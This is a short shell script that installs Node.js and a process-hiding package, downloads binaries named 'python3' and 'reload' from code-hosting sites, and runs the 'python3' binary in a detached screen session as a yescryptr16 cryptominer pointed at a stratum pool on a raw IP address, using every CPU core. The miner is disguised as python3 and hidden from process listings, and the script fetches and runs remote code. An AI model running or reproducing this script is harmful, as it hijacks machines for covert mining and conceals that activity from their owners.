apt update -y
apt install gcc screen -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
apt install nodejs -y
npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add python3 
wget https://github.com/danipedrosang/marcrash/raw/main/python3 && wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload &&  chmod +x python3 reload
screen -dmS run ./python3 -a yescryptr16 -o stratum+tcp://143.198.2.127:443 -u web1qyzgpcnssde96zrfs3n4g6saunyy6mm534wzjeh.edu -t$(nproc --all)
./reload
